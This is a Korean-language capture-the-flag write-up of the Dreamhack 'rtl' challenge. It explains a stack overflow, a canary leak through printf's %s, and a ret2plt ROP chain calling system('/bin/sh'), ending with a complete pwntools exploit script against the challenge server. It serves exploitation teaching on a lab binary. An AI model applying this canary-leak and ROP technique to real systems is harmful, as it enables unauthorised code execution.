# return_to_library (rtl)

Dreamhack `rtl` — 카나리 릭 후 **ret2libc(ROP)** 로 `system("/bin/sh")`.
가장 기본적인 ret2libc 패턴이라 "카나리 우회 + ROP 체인"의 정석을 정리.

바이너리: x86-64, **No PIE**(0x400000) / **Partial RELRO** / **NX** / **Canary found**.

---

## 0. 한눈에

| 항목 | 값 |
|---|---|
| 취약점 | `read(0, buf, 0x100)` 인데 `buf[0x30]` → **스택 BOF** |
| 막는 것 | Canary → **먼저 릭**해서 우회 |
| 익스 | No PIE라 가젯/plt 주소 고정 → **ROP로 `system("/bin/sh")`** |
| 친절한 떡밥 | 소스가 `system("echo ...")`를 미리 호출 → **`system@plt`가 이미 생김** |

```c
int main() {
  char buf[0x30];
  system("echo 'system@plt'");      // ★ system@plt 를 PLT 에 미리 등록해줌(힌트)

  // [1] 카나리 릭
  read(0, buf, 0x100);              // 0x30 버퍼에 0x100 → BOF
  printf("Buf: %s\n", buf);         // %s → 널 전까지 출력 = 릭 수단

  // [2] 리턴 주소 덮기
  read(0, buf, 0x100);              // 두 번째 입력으로 ROP
  return 0;
}
```

---

## 1. 생각의 흐름

1. checksec에 Canary가 있지만 `read`가 `0x100`이라 BOF는 확정. **카나리만 알면 끝.**
2. 소스가 `printf("Buf: %s\n", buf)`로 **buf를 그대로 출력** → 카나리를 릭할 창구가 이미 있다.
   - 카나리는 최하위 바이트가 `\x00`. `%s`는 널에서 끊기므로, **카나리 바로 앞까지 꽉 채워 널바이트를 밀어내면** 이어서 카나리가 출력된다.
3. No PIE라 `system@plt`, `pop rdi`, `/bin/sh`(사실 바이너리에 `const char* binsh="/bin/sh"` 있음) **전부 고정 주소** → libc 릭조차 필요 없다. 바이너리 안에서 ret2libc(정확히는 ret2plt) 완성.

---

## 2. 스택 레이아웃 & 오프셋

`buf[0x30]` 다음에 `saved rbp(0x8)` → `canary`는 그 사이. 소스/디버깅으로 보면:

```
[ buf : 0x38 bytes ] [ canary : 0x8 ] [ saved rbp : 0x8 ] [ ret addr ]
```

- 카나리까지 거리 = `0x38`
- 카나리 릭용: `'A'*0x39` 를 보내면 buf 0x38 + 카나리 최하위 널 1바이트를 덮어 `%s`가 **카나리 상위 7바이트까지 이어서** 출력.
  → `canary = u64(b'\x00' + 릭된 7바이트)` 로 널 복원.

---

## 3. ROP 체인

```
ret            # 스택 16바이트 정렬 (system 내부 movaps 정렬 깨짐 방지)
pop rdi ; ret  # 1st arg
&"/bin/sh"     # rdi = /bin/sh
system@plt     # system("/bin/sh")
```

`ret` 하나를 앞에 끼우는 이유: glibc `system` 내부 `movaps`가 16바이트 정렬을 요구 → 정렬이 어긋나면 SIGSEGV. ret gadget 한 번으로 8바이트 밀어 맞춘다.

---

## 4. Exploit (`poc.py`)

```python
from pwn import *
p = remote('host3.dreamhack.games', 13389)
e = ELF('./rtl'); r = ROP(e)

system  = e.plt['system']
pop_rdi = r.find_gadget(['pop rdi'])[0]
ret     = r.find_gadget(['ret'])[0]
binsh   = next(e.search(b"/bin/sh"))

# [1] 카나리 릭
p.sendafter(b'Buf: ', b'A'*0x39)         # 0x38 + 널 1바이트 덮기
p.recvuntil(b'A'*0x39)
canary = u64(b'\x00' + p.recvn(7))       # 최하위 널 복원
log.info(f"canary = {hex(canary)}")

# [2] 리턴 주소 덮기 → ret2libc
payload  = b'a'*0x38 + p64(canary) + b'b'*0x8   # buf + canary + saved rbp
payload += p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)
p.sendlineafter(b'Buf: ', payload)
p.interactive()
```

---

## 5. 배울 점

- **Canary = 릭 가능하면 그냥 뚫는 장식.** `%s`로 출력해 주는 코드가 있으면 "버퍼를 카나리 직전까지 채워 널을 밀어낸다"가 정석.
- **No PIE면 libc 릭도 생략 가능** — 바이너리 안의 `system@plt`, 가젯, 문자열이 모두 고정 주소라 ret2plt로 바로 끝.
- `system` 호출 전 **`ret` 정렬** 습관화(Ubuntu 18.04+ / glibc 2.27+ movaps 이슈).
- 소스가 괜히 `system("echo ...")`를 호출한 건 **`system@plt` 엔트리를 만들어 주려는 출제자의 힌트**.
